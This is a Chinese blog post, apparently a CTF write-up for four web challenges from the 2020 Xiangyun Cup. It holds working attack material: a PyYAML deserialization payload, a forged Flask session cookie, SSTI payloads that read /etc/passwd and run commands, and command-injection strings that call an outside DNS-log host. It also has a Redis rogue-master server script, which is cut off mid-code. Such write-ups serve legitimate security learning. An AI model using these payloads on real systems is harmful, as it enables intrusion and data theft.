@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020祥云杯Web题目writeup |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020祥云杯Web题目writeup" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020祥云杯Web题目writeup
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/" class="article-date">
+  <time datetime="2020-11-23T14:00:55.000Z" itemprop="datePublished">2020-11-23</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>没有和学长一起打，干不动，太菜了。</p>
+<a id="more"></a>
+
+<h1 id="0x01-profile-system"><a href="#0x01-profile-system" class="headerlink" title="0x01 profile system"></a>0x01 profile system</h1><p>题目源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = os.path.join(os.curdir, <span class="string">"uploads"</span>)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'Th1s_is_A_Sup333er_s1cret_k1yyyyy'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'yaml'</span>,<span class="string">'yml'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'priviledge'</span>] = <span class="string">'guest'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route("/upload", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.files[<span class="string">"file"</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        flash(<span class="string">'No selected file'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> (allowed_file(file.filename) <span class="keyword">in</span> ALLOWED_EXTENSIONS):</span><br><span class="line">        flash(<span class="string">'Please upload yaml/yml only.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">        filename = file.filename</span><br><span class="line">        session[<span class="string">'filename'</span>] = filename </span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"uploaded.html"</span>,path = os.path.join(dirname, filename))</span><br><span class="line"><span class="meta">@app.route("/uploads/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], path))</span><br><span class="line"><span class="meta">@app.route("/view")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">()</span>:</span></span><br><span class="line">    dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">    realpath = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname,session[<span class="string">'filename'</span>]).replace(<span class="string">'..'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'priviledge'</span>] ==<span class="string">'elite'</span> <span class="keyword">and</span> os.path.isfile(realpath):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(realpath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b"^[ -\-/-\]a-&#125;\n]*$"</span>,data, flags=re.MULTILINE):</span><br><span class="line">                    info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">                    flash(<span class="string">'Sth weird...'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    info = yaml.load(data)</span><br><span class="line">                <span class="keyword">if</span> info[<span class="string">'user'</span>] == <span class="string">'Administrator'</span>:</span><br><span class="line">                    flash(<span class="string">'Welcome admin!'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = &#123;<span class="string">'user'</span>: <span class="string">'guest'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>,user = info[<span class="string">'user'</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>/uploads路由存在路径穿越可以读取文件，</p>
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123220630565.png" alt="image-20201123220630565"></p>
+<p>读取文件后审计源码，可以得到<code>python</code>的<code>session</code>的<code>secret</code>为<code>Th1s_is_A_Sup333er_s1cret_k1yyyyy</code>,有上传<code>yaml、yml</code>文件的功能，在<code>/view</code>路由，会将客户端ip的md5值拼接到upload，然后再拼接<code>session[filename]</code>，之后检查<code>session[&#39;priviledge&#39;] 是否为&#39;elite&#39;</code>和拼接得到的文件名对应的文件是否存在；如果通过检查，则读取文件对应的内容，然后对文件内容进行正则的判断，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(realpath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	data = f.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b"^[ -\-/-\]a-&#125;\n]*$"</span>,data, flags=re.MULTILINE):</span><br><span class="line">    	info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">        flash(<span class="string">'Sth weird...'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = yaml.load(data)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">'user'</span>] == <span class="string">'Administrator'</span>:</span><br><span class="line">        flash(<span class="string">'Welcome admin!'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ()</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123230352889.png" alt="image-20201123230352889" style="zoom:200%;">
+
+<p>上面正则对应的匹配模式如上图，禁止了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.  ^  _  &#96;  ~</span><br></pre></td></tr></table></figure>
+
+<p>这些字符，如果能够通过正则的检测，就会执行yaml.load(data)`，这里有一个yaml的反序列化，<a href="https://hackmd.io/@harrier/uiuctf20" target="_blank" rel="noopener">uiuctf 2020</a>考点和这道题一样，本地生成yaml文件，</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python</span><span class="string">/object/new:type</span></span><br><span class="line"><span class="attr">args:</span> <span class="string">["z",</span> <span class="type">!!python</span><span class="string">/tuple</span> <span class="string">[],</span> <span class="string">&#123;"extend":</span> <span class="type">!!python</span><span class="string">/name:exec</span> <span class="string">&#125;]</span></span><br><span class="line"><span class="attr">listitems:</span> <span class="string">"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x77\x68\x6f\x61\x6d\x69\x20\x3e\x20\x2e\x2f\x75\x70\x6c\x6f\x61\x64\x73\x2f\x34\x64\x39\x65\x38\x31\x39\x65\x37\x35\x34\x32\x62\x33\x34\x62\x38\x30\x35\x32\x36\x32\x61\x39\x61\x30\x65\x66\x61\x64\x38\x37\x2f\x33\x32\x31\x27\x29"</span></span><br></pre></td></tr></table></figure>
+
+<p>转十六进制的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"__import__('os').system('whoami &gt; ./uploads/4d9e819e7542b34b805262a9a0efad87/321')"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">'\\x'</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str_to_hex(str)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>本地测试在win10写文件写出来的换行是<code>\r\n</code>，linux写出来的文件换行是<code>\n</code>，开始用win10写的文件都包含<code>\r</code>，不能通过正则检查，之后用linux就可以了。<code>%0d——\r    %0a——\n</code></p>
+</blockquote>
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124202931172.png" alt="image-20201124202931172"></p>
+<p>为了能够执行到反序列化的点，生成session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;Th1s_is_A_Sup333er_s1cret_k1yyyyy&quot; -t &quot;&#123;&#39;priviledge&#39;:&#39;elite&#39;,&#39;filename&#39;:&#39;aa.yaml&#39;&#125;&quot;</span><br><span class="line">eyJmaWxlbmFtZSI6ImFhLnlhbWwiLCJwcml2aWxlZGdlIjoiZWxpdGUifQ.X7zvPw.AKiTGPDlkdsETAUVmGYrxCc_7jk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124203341378.png" alt="image-20201124203341378"></p>
+<p>之后下载<code>/uploads/4d9e819e7542b34b805262a9a0efad87/321</code>就可以得到结果。</p>
+<h1 id="0x02-flaskbot"><a href="#0x02-flaskbot" class="headerlink" title="0x02 flaskbot"></a>0x02 flaskbot</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,make_response,redirect,url_for,render_template_string</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe</span><span class="params">(str)</span>:</span> </span><br><span class="line">    black_list = [<span class="string">'flag'</span>,<span class="string">'os'</span>,<span class="string">'system'</span>,<span class="string">'popen'</span>,<span class="string">'import'</span>,<span class="string">'eval'</span>,<span class="string">'chr'</span>,<span class="string">'request'</span>, <span class="string">'subprocess'</span>,<span class="string">'commands'</span>,<span class="string">'socket'</span>,<span class="string">'hex'</span>,<span class="string">'base64'</span>,<span class="string">'*'</span>,<span class="string">'?'</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> str.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Damn you hacker! You will never"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessNum</span><span class="params">(num,name)</span>:</span></span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">1000000000.0</span></span><br><span class="line">    mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">    ret=<span class="string">""</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> abs(mid-num)&lt;<span class="number">0.00001</span>:</span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">        <span class="keyword">if</span> mid&gt;num:</span><br><span class="line">            r=mid</span><br><span class="line">            ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is too large&lt;br/&gt;"</span>.format(cnt,mid)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">            ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is too small&lt;br/&gt;"</span>.format(cnt,mid)</span><br><span class="line">        <span class="keyword">if</span> cnt &gt; <span class="number">50</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> cnt &lt; <span class="number">50</span>:</span><br><span class="line">        ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is close enough&lt;br/&gt;I win"</span>.format(cnt,mid)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        ret+=<span class="string">"Wow! &#123;0&#125; win."</span>.format(safe(name))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">        user = request.form[<span class="string">'name'</span>]</span><br><span class="line">        resp = make_response(render_template(<span class="string">"guess.html"</span>,name=user))</span><br><span class="line">        resp.set_cookie(<span class="string">'user'</span>,base64.urlsafe_b64encode(user),max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user=request.cookies.get(<span class="string">'user'</span>)</span><br><span class="line">        <span class="keyword">if</span> user == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user=user.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"guess.html"</span>,name=base64.urlsafe_b64decode(user))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/guess',methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Guess</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.cookies.get(<span class="string">'user'</span>)</span><br><span class="line">    <span class="keyword">if</span> user==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"Hello"</span>))</span><br><span class="line">    user=user.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    name = base64.urlsafe_b64decode(user)</span><br><span class="line">    num = float(request.form[<span class="string">'num'</span>])</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Too Small"</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;<span class="number">1000000000.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Too Large"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(guessNum(num,name))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"What are you looking for?!!"</span>.getattr(app, <span class="string">'__name__'</span>, getattr(app.__class__, <span class="string">'__name__'</span>)), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f_handler=open(<span class="string">'/var/log/app.log'</span>, <span class="string">'w'</span>)</span><br><span class="line">    sys.stderr=f_handler</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124205419080.png" alt="image-20201124205419080"></p>
+<p><a href="https://www.jianshu.com/p/d9caa4ab46e1" target="_blank" rel="noopener">https://www.jianshu.com/p/d9caa4ab46e1</a></p>
+<p>flask开启debug，可以进入console模式，但是需要pin码，会把pin码写进<code>/var/log/app.log</code>，可以通过读这个文件来获取pin码，因为是<code>python2</code>,直接用payload</p>
+<ul>
+<li>读文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;&#123;&#123;().__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&quot;)</span><br><span class="line">&#39;e3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVs0MF0oJy9ldGMvcGFzc3dkJykucmVhZCgpfX0&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124210300013.png" alt="image-20201124210300013"></p>
+<ul>
+<li>执行命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&#39;&#39;&#39;&#123;&#123;().__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;e&#39;+&#39;val&#39;](&quot;__imp&quot;+&quot;ort__(&#39;o&#39;+&#39;s&#39;).po&quot;+&quot;pen(&#39;ls&#39;).read()&quot;)&#125;&#125;&#39;&#39;&#39;)</span><br><span class="line">&#39;e3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVs1OV0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydlJysndmFsJ10oIl9faW1wIisib3J0X18oJ28nKydzJykucG8iKyJwZW4oJ2xzJykucmVhZCgpIil9fQ&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124210912886.png" alt="image-20201124210912886"></p>
+<h1 id="0x03-Command"><a href="#0x03-Command" class="headerlink" title="0x03 Command"></a>0x03 Command</h1><blockquote>
+<p>这题学弟做的，下面是参考了网上的wp</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;|find%09&#x2F;%09-ctime%09-20</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;a.iz99lj.ceye.io%0aecho%09ZmxhZw&#x3D;&#x3D;|base64%09-d|xargs%09-</span><br><span class="line">I%09x%09find%09&#x2F;%09-name%09&quot;x????&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1%0aecho%09L2V0Yy8uZmluZGZsYWcvZmxhZy50eHQ&#x3D;|base64%09-</span><br><span class="line">d|xargs%09sed%09&quot;&quot;%09</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123154353952.png" alt="image-20201123154353952"></p>
+<h1 id="0x04-doyouknowssrf"><a href="#0x04-doyouknowssrf" class="headerlink" title="0x04 doyouknowssrf"></a>0x04 doyouknowssrf</h1><p>GACTF原题，用wp的方法老是失败，可以主从同步复制<code>exp.so</code>，但是<code>system.rev</code>执行不了，之后试了一下，config set dir /var/www/html   然后利用，主从同步将一句话木马同步到靶机，（感觉这题不用主从复制，直接写马就可以）然后，访问木马，得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, format=<span class="string">'&gt;&gt; %(message)s'</span>)</span><br><span class="line">DELIMITER = <span class="string">b"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'*'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip().split(DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'$'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split(DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> data.strip().split()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            logging.info(<span class="string">"receive data: %r"</span>, data)</span><br><span class="line">            arr = self.decode(data)</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PING'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+PONG'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'REPLCONF'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+OK'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PSYNC'</span>) <span class="keyword">or</span> arr[<span class="number">0</span>].startswith(<span class="string">b'SYNC'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+FULLRESYNC '</span> + <span class="string">b'Z'</span> * <span class="number">40</span> + <span class="string">b' 1'</span> + DELIMITER)</span><br><span class="line">                self.request.sendall(<span class="string">b'$'</span> + str(len(self.server.payload)).encode() + DELIMITER)</span><br><span class="line">                self.request.sendall(self.server.payload + DELIMITER)</span><br><span class="line">                <span 